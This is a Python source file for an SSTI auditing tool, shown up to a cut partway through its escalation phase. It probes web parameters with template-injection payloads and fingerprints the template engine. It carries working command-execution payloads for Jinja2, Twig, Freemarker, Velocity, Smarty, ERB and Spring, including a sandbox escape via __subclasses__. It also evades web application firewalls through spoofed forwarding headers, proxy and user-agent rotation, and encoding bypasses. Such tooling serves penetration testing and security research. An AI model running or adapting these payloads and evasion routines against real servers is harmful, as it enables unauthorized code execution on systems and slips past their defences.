#!/usr/bin/env python3
"""
auditing_tools/ssti_finder.py — Server-Side Template Injection Auditor (v4.0)
═══════════════════════════════════════════════════════════════════════════════

Military-grade SSTI detection with WAF evasion, engine fingerprinting,
blind confirmation, and confirmed-only output.

SAFETY MODEL
────────────
Every target request flows through `EvasionSession`:
  • Jittered pacing
  • User-Agent + X-Forwarded-For rotation
  • Optional proxy rotation
  • Exponential back-off on 403/406/429/503
  • 60-second cool-down after a WAF block page

CONFIRMATION MODEL (no false positives)
───────────────────────────────────────
A finding is CONFIRMED only when:

  ARITHMETIC — `{{7*7}}` (or engine-specific equivalent) renders `49`,
               AND `49` is not preexisting baseline noise. When `49` already
               appears in the baseline, a unique `{{31137*31137}}` verification
               must also render `969512769`.

  BLIND      — Three engine-specific `sleep` payloads produce a repeatable
               delay whose Z-score exceeds baseline jitter, with at least
               2/3 probes above the threshold.

  PROOF      — A non-destructive command (`id`, `whoami`, `hostname`) returns
               output that matches a shell-output signature (e.g., `uid=`)
               and does NOT appear in the baseline.

  ERROR      — An engine-specific error signature is triggered. Reported as
               candidate (HIGH, unconfirmed) — not persisted to confirmed.

SEVERITY (impact-driven)
────────────────────────
  CRITICAL   Arithmetic confirmed (template execution proven), OR blind timing
             confirmed, OR escalation proof confirmed (command execution).
  HIGH       Engine error fingerprint triggered without arithmetic confirmation.
  MEDIUM     Surface candidate only.
  LOW        Denial / param ignored.

CHAINS
──────
  ssti-jinja2-rce        Jinja2 → os.popen chain
  ssti-twig-rce          Twig → registerUndefinedFilterCallback chain
  ssti-freemarker-rce    Freemarker → Execute utility chain
  ssti-velocity-rce      Velocity → Runtime.exec chain
  ssti-blind             Blind timing confirmed
  ssti-sandbox-escape    `_` filtered but `|attr` or bracket notation bypasses

OUTPUTS
───────
  ssti_findings.json      every finding
  ssti_confirmed.json     HIGH / CRITICAL only
  ssti_chains.json        structured chain records
  ssti_candidates.txt     flat triage
  ssti_confirmed.txt      confirmed flat triage
  ssti_engine.txt         per-surface engine fingerprint map
  ssti_evidence/          raw baseline + probe bodies per confirmed finding
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import math
import random
import re
import statistics
import string
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.ssti_finder")


# ═════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═════════════════════════════════════════════════════════════════════════════

try:
    import config as CFG
    CFG_LOADED = True
except ImportError:
    CFG = None
    CFG_LOADED = False

try:
    from db import DB
    DB_AVAILABLE = True
except ImportError:
    DB = None
    DB_AVAILABLE = False


def _cfg(key: str, default=None):
    return getattr(CFG, key, default) if CFG_LOADED else default


def _ssti_settings() -> dict:
    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("ssti", {}) or {}
    return {
        "rate_limit":   entry.get("rate_limit", 3),
        "concurrency":  entry.get("concurrency", 3),
        "timeout":      entry.get("timeout", 12),
        "max_surfaces": entry.get("max_surfaces", 300),
        "blind":        entry.get("blind", True),
        "escalation":   entry.get("escalation", True),
        "jitter":       entry.get("jitter", 0.4),
        "proxies":      entry.get("proxies", []),
    }


def _target_headers() -> dict[str, str]:
    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
        h.update(getattr(CFG, "AUTH_HEADERS", {}) or {})
    return h


def _db_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


# ═════════════════════════════════════════════════════════════════════════════
#  SEVERITY
# ═════════════════════════════════════════════════════════════════════════════

class Severity(str, Enum):
    INFO     = "INFO"
    LOW      = "LOW"
    MEDIUM   = "MEDIUM"
    HIGH     = "HIGH"
    CRITICAL = "CRITICAL"

    @property
    def rank(self) -> int:
        return {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}[self.value]


# ═════════════════════════════════════════════════════════════════════════════
#  WAF DETECTION + EVASION
# ═════════════════════════════════════════════════════════════════════════════

WAF_SIGNATURES: dict[str, dict] = {
    "Cloudflare":  {"headers": ["cf-ray", "__cf_bm"], "body": ["Attention Required! | Cloudflare"]},
    "Akamai":      {"headers": ["akamai-grn", "x-akamai-transformed"], "body": ["Access Denied"]},
    "Imperva":     {"headers": ["x-iinfo", "incap_ses"], "body": ["Pardon Our Interruption"]},
    "AWS WAF":     {"headers": ["x-amzn-requestid"], "body": ["Request blocked"]},
    "F5 BIG-IP":   {"headers": ["x-wa-info", "bigipserver"], "body": ["The requested URL was rejected"]},
    "Sucuri":      {"headers": ["x-sucuri-id"], "body": ["Sucuri WebSite Firewall"]},
    "DataDome":    {"headers": ["x-datadome"], "body": ["captcha-delivery"]},
    "ModSecurity": {"headers": ["x-mod-security"], "body": ["ModSecurity"]},
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
]


@dataclass
class WAFReport:
    vendor: str = "unknown"
    confidence: int = 0
    signals: list[str] = field(default_factory=list)
    blocked: bool = False


@dataclass
class EvasionProfile:
    rate_limit: float = 3.0
    jitter: float = 0.4
    rotate_ua: bool = True
    rotate_xff: bool = True
    proxies: list[str] = field(default_factory=list)
    backoff_codes: tuple[int, ...] = (403, 406, 429, 503)
    max_backoff: float = 30.0
    cooldown_after_block: float = 60.0


class EvasionSession:
    def __init__(self, profile: EvasionProfile, timeout: int = 12):
        self.profile = profile
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update(_target_headers())
        self._min_interval = 1.0 / profile.rate_limit if profile.rate_limit > 0 else 0.0
        self._last = 0.0
        self._backoff = 0.0
        self._cooldown_until = 0.0
        self._proxy_idx = 0
        self._ua_idx = 0
        self._xff_counter = 0
        self._lock = threading.Lock()

    def __enter__(self): return self
    def __exit__(self, *exc):
        try: self.session.close()
        except Exception: pass

    def _pace(self):
        now = time.monotonic()
        if now < self._cooldown_until:
            time.sleep(self._cooldown_until - now)
        interval = self._min_interval + random.uniform(0, self.profile.jitter)
        elapsed = time.monotonic() - self._last
        if elapsed < interval:
            time.sleep(interval - elapsed)
        if self._backoff > 0:
            time.sleep(self._backoff)
        self._last = time.monotonic()

    def _rotate(self):
        with self._lock:
            if self.profile.rotate_ua:
                self.session.headers["User-Agent"] = USER_AGENTS[
                    self._ua_idx % len(USER_AGENTS)
                ]
                self._ua_idx += 1
            if self.profile.rotate_xff:
                self._xff_counter += 1
                o = self._xff_counter % 254 + 1
                self.session.headers["X-Forwarded-For"] = f"10.0.{o}.{o}"
                self.session.headers["X-Real-IP"] = f"10.0.{o}.{o}"

    def _proxy(self) -> Optional[dict]:
        if not self.profile.proxies:
            return None
        with self._lock:
            p = self.profile.proxies[self._proxy_idx % len(self.profile.proxies)]
            self._proxy_idx += 1
        return {"http": p, "https": p}

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        self._pace()
        self._rotate()
        proxy = self._proxy()
        try:
            resp = self.session.request(
                method, url,
                timeout=kwargs.pop("timeout", self.timeout),
                allow_redirects=kwargs.pop("allow_redirects", False),
                verify=False, proxies=proxy, **kwargs,
            )
        except requests.RequestException as e:
            log.debug(f"request failed: {method} {url}: {e}")
            return None

        if resp.status_code in self.profile.backoff_codes:
            self._backoff = min(self.profile.max_backoff,
                                max(1.0, self._backoff * 2 or 1.0))
            low = _body(resp)[:2000].lower()
            if any(w in low for w in ("blocked", "firewall", "captcha", "denied")):
                self._cooldown_until = time.monotonic() + self.profile.cooldown_after_block
                log.warning("  WAF block — cooling down %.0fs",
                            self.profile.cooldown_after_block)
        elif resp.status_code < 400:
            self._backoff = 0.0
        return resp

    def get(self, url: str, **kwargs):
        return self.request("GET", url, **kwargs)

    def benign_get(self, url: str) -> Optional[requests.Response]:
        try:
            return self.session.get(url, timeout=self.timeout, verify=False)
        except requests.RequestException:
            return None


def detect_waf(session: EvasionSession, url: str) -> WAFReport:
    report = WAFReport()
    try:
        resp = session.benign_get(url)
    except Exception:
        return report
    if resp is None:
        return report
    header_blob = " ".join(f"{k.lower()}:{v}" for k, v in resp.headers.items()).lower()
    body_blob = _body(resp)[:4000].lower()
    for vendor, sig in WAF_SIGNATURES.items():
        hits = [f"header:{h}" for h in sig["headers"] if h.lower() in header_blob]
        hits += [f"body:{b[:40]}" for b in sig["body"] if b.lower() in body_blob]
        if hits:
            report.vendor = vendor
            report.signals = hits
            report.confidence = min(100, 50 + 15 * len(hits))
            break
    if resp.status_code in (403, 406, 429, 503):
        low = _body(resp)[:2000].lower()
        if any(w in low for w in ("blocked", "denied", "firewall", "captcha")):
            report.blocked = True
            if report.vendor == "unknown":
                report.vendor = "generic-waf"
                report.confidence = 40
    return report


# ═════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT      = 12
BASELINE_SAMPLES     = 3
REQUEST_SLEEP        = 0.08
BLIND_DELAY_SECONDS  = 5
BLIND_TOLERANCE      = 0.65
BLIND_ATTEMPTS       = 3
BLIND_AGREEMENT      = 2
BLIND_Z_THRESHOLD    = 2.5
MAX_URLS             = 5000
UNIQUE_MULT_VERIFY   = 31137
UNIQUE_MULT_RESULT   = "969512769"

POLYGLOT_PROBES = [
    ("jinja_twig",     "{{7*7}}",         "49"),
    ("freemarker",     "${7*7}",          "49"),
    ("erb_ejs",        "<%= 7*7 %>",      "49"),
    ("spring_spel",    "${{7*7}}",        "49"),
    ("pug_ruby",       "#{7*7}",          "49"),
    ("spring_ognl",    "*{7*7}",          "49"),
    ("thymeleaf",      "@{7*7}",          "49"),
    ("smarty",         "{7*7}",           "49"),
]

UNIVERSAL_PROBE = ("universal", "${{<%[%'\"}}%\\")

UNIQUE_VERIFY_MAP = {
    "jinja_twig":  ("{{31137*31137}}",        UNIQUE_MULT_RESULT),
    "freemarker":  ("${31137*31137}",         UNIQUE_MULT_RESULT),
    "erb_ejs":     ("<%= 31137*31137 %>",     UNIQUE_MULT_RESULT),
    "spring_spel": ("${{31137*31137}}",       UNIQUE_MULT_RESULT),
    "pug_ruby":    ("#{31137*31137}",         UNIQUE_MULT_RESULT),
    "spring_ognl": ("*{31137*31137}",         UNIQUE_MULT_RESULT),
    "thymeleaf":   ("@{31137*31137}",         UNIQUE_MULT_RESULT),
    "smarty":      ("{31137*31137}",          UNIQUE_MULT_RESULT),
}

ENGINE_ERROR_SIGNATURES = {
    "Jinja2":     [r"jinja2\.exceptions", r"jinja2"],
    "Twig":       [r"Twig_Error", r"twig"],
    "Freemarker": [r"freemarker\.", r"FreeMarker"],
    "Velocity":   [r"velocity\.", r"Velocity"],
    "Smarty":     [r"Smarty", r"smarty"],
    "ERB":        [r"ERB", r"erb\.exceptions"],
    "Thymeleaf":  [r"Thymeleaf", r"thymeleaf"],
    "Mako":       [r"Mako", r"mako\.exceptions"],
    "Spring":     [r"SpelEvaluationException", r"SpEL", r"org\.springframework\.expression"],
}

BLIND_PAYLOADS = {
    "Jinja2": [
        "{{config.__class__.__init__.__globals__['os'].system('sleep {d}')}}",
        "{{lipsum.__globals__['os'].system('sleep {d}')}}",
        "{{cycler.__init__.__globals__.os.system('sleep {d}')}}",
    ],
    "Twig": [
        "{{['sleep {d}']|filter('system')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('sleep {d}')}}",
    ],
    "Freemarker": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep {d}")}',
    ],
    "Velocity": [
        '#set($x="")$x.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("sleep {d}")',
    ],
    "Smarty": [
        '{system("sleep {d}")}',
    ],
    "ERB": [
        "<%= system('sleep {d}') %>",
    ],
    "Spring": [
        "*{T(java.lang.Runtime).getRuntime().exec('sleep {d}')}",
    ],
}

PROOF_COMMANDS = ["id", "whoami", "hostname"]

PROOF_PAYLOADS = {
    "Jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
        "{{lipsum.__globals__.os.popen('{cmd}').read()}}",
        "{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}",
    ],
    "Twig": [
        "{{['{cmd}']|filter('system')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('{cmd}')}}",
    ],
    "Freemarker": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{cmd}")}',
    ],
    "Velocity": [
        '#set($x="")$x.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("{cmd}")',
    ],
    "Smarty": [
        '{system("{cmd}")}',
    ],
    "ERB": [
        "<%= `{cmd}` %>",
        "<%= system('{cmd}') %>",
    ],
    "Spring": [
        "*{T(java.lang.Runtime).getRuntime().exec('{cmd}')}",
    ],
}

# Aggressive-only additional payloads
AGGRESSIVE_PROOF_PAYLOADS = {
    "Jinja2": [
        "{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}",
    ],
}

PROOF_PATTERNS_GLOBAL = [
    r"uid=\d+\([^)]+\)",
    r"gid=\d+\([^)]+\)",
    r"\broot\b",
    r"\bwww-data\b",
    r"\bnobody\b",
    r"\bnginx\b",
    r"\bapache\b",
]

DENIAL_MARKERS = (
    "blocked", "forbidden", "not allowed", "invalid input",
    "input rejected", "malicious", "waf", "sanitized",
    "not permitted", "request denied",
)

PROOF_ENGINES = tuple(PROOF_PAYLOADS.keys())


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class Baseline:
    url: str
    param: str
    location: str = "query"
    status: int = 0
    length: int = 0
    body: str = ""
    median_time: float = 0.0
    time_stddev: float = 0.0
    preexisting_numbers: set[str] = field(default_factory=set)
    preexisting_proof_patterns: set[str] = field(default_factory=set)

    def to_dict(self) -> dict:
        return {
            "url": self.url, "param": self.param, "location": self.location,
            "status": self.status, "length": self.length,
            "median_time": round(self.median_time, 3),
            "time_stddev": round(self.time_stddev, 3),
            "preexisting_numbers": sorted(self.preexisting_numbers),
            "preexisting_proof_patterns": sorted(self.preexisting_proof_patterns),
        }


@dataclass
class SSTIFinding:
    target: str
    param: str
    technique: str
    severity: Severity = Severity.MEDIUM
    confidence: int = 50
    confirmed: bool = False
    engine: str = ""
    payload: str = ""
    evidence: str = ""
    bypass_used: str = ""
    param_location: str = "query"
    http_status: int = 0
    chain_ids: list[str] = field(default_factory=list)
    waf_vendor: str = ""
    auth_enabled: bool = False
    first_seen: str = ""
    details: dict = field(default_factory=dict)

    @property
    def finding_hash(self) -> str:
        return hashlib.sha256(f"{self.target}|{self.param}|{self.technique}".encode()).hexdigest()

    @property
    def target_host(self) -> str:
        return urllib.parse.urlparse(self.target).hostname or ""

    def to_dict(self) -> dict:
        return {
            "target":         self.target,
            "target_host":    self.target_host,
            "param_name":     self.param,
            "param_location": self.param_location,
            "technique":      self.technique,
            "severity":       self.severity.value,
            "confidence":     self.confidence,
            "confirmed":      self.confirmed,
            "engine":         self.engine,
            "payload":        (self.payload or "")[:2048],
            "evidence":       (self.evidence or "")[:1024],
            "bypass_used":    self.bypass_used,
            "http_status":    self.http_status,
            "chain_ids":      self.chain_ids,
            "waf_vendor":     self.waf_vendor,
            "details":        self.details,
            "auth_enabled":   self.auth_enabled,
            "finding_hash":   self.finding_hash,
            "first_seen":     self.first_seen or _db_now(),
        }


@dataclass
class SSTIChain:
    chain_id: str
    name: str
    severity: Severity
    steps: list[str]
    finding_hashes: list[str] = field(default_factory=list)
    evidence: str = ""

    def to_dict(self) -> dict:
        return {
            "chain_id":       self.chain_id,
            "name":           self.name,
            "severity":       self.severity.value,
            "steps":          self.steps,
            "finding_hashes": self.finding_hashes,
            "evidence":       self.evidence[:600],
        }


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls, seen = [], set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        tok = line.split()[0]
        if not tok.startswith(("http://", "https://")):
            tok = "https://" + tok
        if tok not in seen:
            seen.add(tok)
            urls.append(tok)
    return urls


def _inject_query(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(new, safe="%{}<>*$"))
    )


def _body(resp: Optional[requests.Response], limit: int = 200_000) -> str:
    if resp is None:
        return ""
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def _extract_numbers(body: str) -> set[str]:
    return set(re.findall(r"\b\d{1,12}\b", body))


def _extract_proof_patterns(body: str) -> set[str]:
    found: set[str] = set()
    for pat in PROOF_PATTERNS_GLOBAL:
        for m in re.finditer(pat, body, re.I):
            found.add(m.group(0).lower())
    return found


def _fingerprint_error(body: str) -> str:
    for engine, sigs in ENGINE_ERROR_SIGNATURES.items():
        for sig in sigs:
            if re.search(sig, body, re.I):
                return engine
    return ""


def _looks_denied(resp: Optional[requests.Response]) -> bool:
    # v4 fix: network error is NOT a denial
    if resp is None:
        return False
    body_low = _body(resp).lower()[:2000]
    return any(m in body_low for m in DENIAL_MARKERS)


def _engines_to_try(engine: str) -> list[str]:
    if not engine:
        return []
    if engine in PROOF_PAYLOADS:
        return [engine]
    if engine == "Twig_or_Smarty":
        return ["Twig", "Smarty"]
    if engine == "Jinja2_Twig":
        return ["Jinja2", "Twig"]
    return []


def _probe(session: EvasionSession, surface: dict, payload: str,
           timeout: Optional[int] = None) -> Optional[requests.Response]:
    if surface["location"] == "query":
        url = _inject_query(surface["url"], surface["param"], payload)
        return session.get(url, **({"timeout": timeout} if timeout else {}))
    if surface["location"] == "body":
        return session.request(
            surface.get("method", "POST"), surface["url"],
            data={surface["param"]: payload},
            **({"timeout": timeout} if timeout else {}),
        )
    return None


def _severity_for(technique: str, confirmed: bool) -> tuple[Severity, int]:
    if confirmed:
        if technique in ("arithmetic", "blind", "proof"):
            return (Severity.CRITICAL, 95 if technique == "proof" else 90)
    if technique == "error":
        return (Severity.HIGH, 75)
    return (Severity.MEDIUM, 55)


def _chain_ids_for(f: SSTIFinding) -> list[str]:
    if not f.confirmed:
        return []
    ids: list[str] = []
    engine_l = f.engine.lower()
    if "jinja2" in engine_l:
        ids.append("ssti-jinja2-rce")
    elif "twig" in engine_l:
        ids.append("ssti-twig-rce")
    elif "freemarker" in engine_l:
        ids.append("ssti-freemarker-rce")
    elif "velocity" in engine_l:
        ids.append("ssti-velocity-rce")
    if f.technique == "blind":
        ids.append("ssti-blind")
    if f.bypass_used:
        ids.append("ssti-sandbox-escape")
    return list(dict.fromkeys(ids))


def build_chains(findings: list[SSTIFinding]) -> list[SSTIChain]:
    chains: dict[str, list[SSTIFinding]] = {}
    NAMES = {
        "ssti-jinja2-rce":       "Jinja2 → os.popen RCE",
        "ssti-twig-rce":         "Twig → registerUndefinedFilterCallback RCE",
        "ssti-freemarker-rce":   "Freemarker → Execute utility RCE",
        "ssti-velocity-rce":     "Velocity → Runtime.exec RCE",
        "ssti-blind":            "Blind SSTI confirmed via timing",
        "ssti-sandbox-escape":   "Sandbox escape via filter/attr bypass",
    }
    for f in findings:
        for cid in (_chain_ids_for(f) or f.chain_ids):
            chains.setdefault(cid, []).append(f)
            if cid not in f.chain_ids:
                f.chain_ids.append(cid)
    out: list[SSTIChain] = []
    for cid, fs in chains.items():
        max_sev = max(fs, key=lambda x: x.severity.rank).severity
        out.append(SSTIChain(
            chain_id=cid, name=NAMES.get(cid, cid), severity=max_sev,
            steps=[x.evidence for x in fs],
            finding_hashes=[x.finding_hash for x in fs],
            evidence=fs[0].evidence if fs else "",
        ))
    return out


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

def discover_query_surfaces(urls: list[str]) -> list[dict]:
    surfaces: list[dict] = []
    seen: set[tuple] = set()
    for url in urls:
        parsed = urllib.parse.urlparse(url)
        for pname in urllib.parse.parse_qs(parsed.query):
            key = (url, pname, "query")
            if key in seen:
                continue
            seen.add(key)
            surfaces.append({
                "url": url, "param": pname, "location": "query", "method": "GET",
            })
    return surfaces


def discover_body_surfaces(outdir: Path) -> list[dict]:
    pages_file = outdir / "site_pages.json"
    if not pages_file.exists():
        return []
    try:
        data = json.loads(pages_file.read_text())
    except Exception:
        return []

    surfaces: list[dict] = []
    seen: set[tuple] = set()
    for page in data.get("pages") or []:
        page_url = page.get("url") or ""
        for form in page.get("forms") or []:
            if (form.get("method") or "").upper() != "POST":
                continue
            action = form.get("action") or page_url
            for field_def in form.get("fields") or []:
                fname = field_def.get("name") or ""
                if not fname:
                    continue
                key = (action, fname, "body")
                if key in seen:
                    continue
                seen.add(key)
                surfaces.append({
                    "url": action, "param": fname,
                    "location": "body", "method": "POST",
                })
    return surfaces


# ═════════════════════════════════════════════════════════════════════════════
#  BASELINE
# ═════════════════════════════════════════════════════════════════════════════

def build_baseline(session: EvasionSession, surface: dict) -> Baseline:
    baseline = Baseline(
        url=surface["url"], param=surface["param"],
        location=surface["location"],
    )
    times: list[float] = []
    for _ in range(BASELINE_SAMPLES):
        start = time.monotonic()
        if surface["location"] == "body":
            resp = session.request(
                surface.get("method", "POST"), surface["url"],
                data={surface["param"]: "argusbaseline"},
            )
        else:
            resp = session.get(surface["url"])
        times.append(time.monotonic() - start)
        if resp and not baseline.status:
            baseline.status = resp.status_code
            baseline.body = _body(resp)
            baseline.length = len(baseline.body)
            baseline.preexisting_numbers = _extract_numbers(baseline.body)
            baseline.preexisting_proof_patterns = _extract_proof_patterns(baseline.body)
        time.sleep(REQUEST_SLEEP)
    if times:
        baseline.median_time = statistics.median(times)
        if len(times) > 1:
            baseline.time_stddev = statistics.pstdev(times)
    return baseline


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — POLYGLOT DETECTION
# ═════════════════════════════════════════════════════════════════════════════

def test_polyglot(
    session: EvasionSession, surface: dict, baseline: Baseline,
) -> list[SSTIFinding]:
    findings: list[SSTIFinding] = []
    for label, payload, expected in POLYGLOT_PROBES:
        resp = _probe(session, surface, payload)
        time.sleep(REQUEST_SLEEP)
        if resp is None or _looks_denied(resp):
            continue
        body = _body(resp)
        if expected in body:
            if expected in baseline.preexisting_numbers:
                unique = UNIQUE_VERIFY_MAP.get(label)
                if unique:
                    u_payload, u_expected = unique
                    u_resp = _probe(session, surface, u_payload)
                    time.sleep(REQUEST_SLEEP)
                    if u_resp and u_expected in _body(u_resp):
                        findings.append(_arith_finding(
                            surface, label, u_payload, u_expected, u_resp,
                            confidence=97, note="unique-number verification",
                        ))
                        return findings
                continue
            findings.append(_arith_finding(
                surface, label, payload, expected, resp,
                confidence=95, note="arithmetic (49)",
            ))
            return findings
        engine = _fingerprint_error(body)
        if engine:
            findings.append(SSTIFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                technique="error", severity=Severity.HIGH, confidence=80,
                confirmed=False, engine=engine, payload=payload,
                http_status=resp.status_code,
                evidence=f"{engine} error triggered by '{label}' probe",
                details={"probe": label, "body_snippet": body[:400]},
            ))
            return findings

    label, payload = UNIVERSAL_PROBE
    resp = _probe(session, surface, payload)
    time.sleep(REQUEST_SLEEP)
    if resp and not _looks_denied(resp):
        engine = _fingerprint_error(_body(resp))
        if engine:
            findings.append(SSTIFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                technique="error", severity=Severity.HIGH, confidence=75,
                confirmed=False, engine=engine, payload=payload,
                http_status=resp.status_code,
                evidence=f"{engine} error triggered by universal polyglot",
                details={"probe": label, "body_snippet": _body(resp)[:400]},
            ))
    return findings


def _arith_finding(
    surface: dict, label: str, payload: str, expected: str,
    resp: requests.Response, *, confidence: int, note: str,
) -> SSTIFinding:
    return SSTIFinding(
        target=surface["url"], param=surface["param"],
        param_location=surface["location"],
        technique="arithmetic", severity=Severity.CRITICAL, confidence=confidence,
        confirmed=True, payload=payload,
        http_status=resp.status_code,
        evidence=f"Arithmetic evaluated: '{payload}' → '{expected}' ({note})",
        details={"probe": label, "expected": expected, "note": note,
                 "body_snippet": _body(resp)[:400]},
    )


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — ENGINE FINGERPRINTING
# ═════════════════════════════════════════════════════════════════════════════

def fingerprint_engine(session: EvasionSession, surface: dict) -> str:
    resp = _probe(session, surface, "{{7*7}}")
    time.sleep(REQUEST_SLEEP)
    if resp and "49" in _body(resp):
        resp = _probe(session, surface, "{{7*'7'}}")
        time.sleep(REQUEST_SLEEP)
        if resp:
            body = _body(resp)
            if "7777777" in body:
                return "Jinja2"
            if "49" in body:
                return "Twig_or_Smarty"
        resp = _probe(session, surface, "{% if 7*7 == 49 %}ARGUS_YES{% endif %}")
        time.sleep(REQUEST_SLEEP)
        if resp and "ARGUS_YES" in _body(resp):
            return "Jinja2_Twig"
        return "Twig_or_Smarty"

    resp = _probe(session, surface, "${7*7}")
    time.sleep(REQUEST_SLEEP)
    if resp and "49" in _body(resp):
        resp = _probe(session, surface, "${7*'7'}")
        time.sleep(REQUEST_SLEEP)
        if resp:
            body = _body(resp)
            if "7777777" in body:
                return "Velocity"
            if "<#assign" in body or "<#--" in body:
                return "Freemarker"
        resp = _probe(session, surface, "<#assign x=1>${x}")
        time.sleep(REQUEST_SLEEP)
        if resp and "1" in _body(resp):
            return "Freemarker"
        return "Java_EL"

    for probe in ("{{7*7}}", "${7*7}", "<%= 7*7 %>"):
        resp = _probe(session, surface, probe)
        time.sleep(REQUEST_SLEEP)
        if resp:
            engine = _fingerprint_error(_body(resp))
            if engine:
                return engine
    return ""


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — BLIND
# ═════════════════════════════════════════════════════════════════════════════

def test_blind(
    session: EvasionSession, surface: dict, baseline: Baseline,
    engine: str = "",
) -> list[SSTIFinding]:
    if engine in BLIND_PAYLOADS:
        families = [engine]
    elif engine == "Twig_or_Smarty":
        families = ["Twig", "Smarty"]
    elif engine == "Jinja2_Twig":
        families = ["Jinja2", "Twig"]
    else:
        families = list(BLIND_PAYLOADS.keys())

    for family in families:
        for template in BLIND_PAYLOADS.get(family, []):
            payload = template.format(d=BLIND_DELAY_SECONDS)
            timings: list[float] = []
            for _ in range(BLIND_ATTEMPTS):
                start = time.monotonic()
                resp = _probe(session, surface, payload,
                              timeout=BLIND_DELAY_SECONDS + 10)
                elapsed = time.monotonic() - start
                if resp is not None:
                    timings.append(elapsed)
                time.sleep(REQUEST_SLEEP)
            if not timings:
                continue

            threshold = baseline.median_time + (BLIND_DELAY_SECONDS * BLIND_TOLERANCE)
            above = sum(1 for t in timings if t >= threshold)

            # Statistical Z-score confirmation
            if baseline.time_stddev > 0:
                z_scores = [(t - baseline.median_time) / baseline.time_stddev
                            for t in timings]
                z_confirmed = sum(1 for z in z_scores if z >= BLIND_Z_THRESHOLD)
            else:
                z_confirmed = above

            if above >= BLIND_AGREEMENT and z_confirmed >= BLIND_AGREEMENT:
                return [SSTIFinding(
                    target=surface["url"], param=surface["param"],
                    param_location=surface["location"],
                    technique="blind", severity=Severity.CRITICAL, confidence=85,
                    confirmed=True, engine=family, payload=payload,
                    evidence=(
                        f"Repeatable delay: {above}/{len(timings)} probes "
                        f"≥ {threshold:.1f}s (baseline {baseline.median_time:.2f}s)"
                    ),
                    details={
                        "timings": [round(t, 2) for t in timings],
                        "threshold": round(threshold, 2),
                        "delay_seconds": BLIND_DELAY_SECONDS,
                    },
                )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 4 — WAF BYPASS VARIANTS
# ═════════════════════════════════════════════════════════════════════════════

def _bypass_variants(payload: str) -> list[tuple[str, str]]:
    out: list[tuple[str, str]] = []
    if "_" in payload:
        out.append((payload.replace("_", "\\x5f"), "hex_underscore"))
        out.append((payload.replace("_", "\\137"), "octal_underscore"))
        out.append((payload.replace("_", "\\u005f"), "unicode_underscore"))
    if "__" in payload:
        attr = payload.replace(
            "__class__", "|attr('\\x5f\\x5fclass\\x5f\\x5f')"
        )
        if attr != payload:
            out.append((attr, "attr_filter"))
    bracket = re.sub(r"\.([a-zA-Z_][a-zA-Z0-9_]*)", r"['\1']", payload)
    if bracket != payload:
        out.append((bracket, "bracket_notation"))
    return out


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — ESCALATION PROOF
# ═════════════════════════════════════════════════════════════════════════════

def test_escalation(
    session: EvasionSession, surface: dict, baseline: Baseline, engine: str,
    aggressive: bool = False,
) -> list[SSTIFinding]:
    for concrete_engine in _engines_to_try(engine):
        all_templates = list(PROOF_PAYLOADS.get(concrete_engine, []))
        if aggressive:
            all_templates.extend(AGGRESSIVE_PROOF_PAYLOADS.get(concrete_engine, []))

        for cmd in PROOF_COMMANDS:
            for template in all_templates:
                if "INDEX" in template:
                    # Aggressive sandbox-escape: try indices
                    for idx in (0, 1, 2, 3, 40, 104, 132, 133):
                        p = template.replace("INDEX", str(idx)).format(cmd=cmd)
                        resp = _probe(session, surface, p)
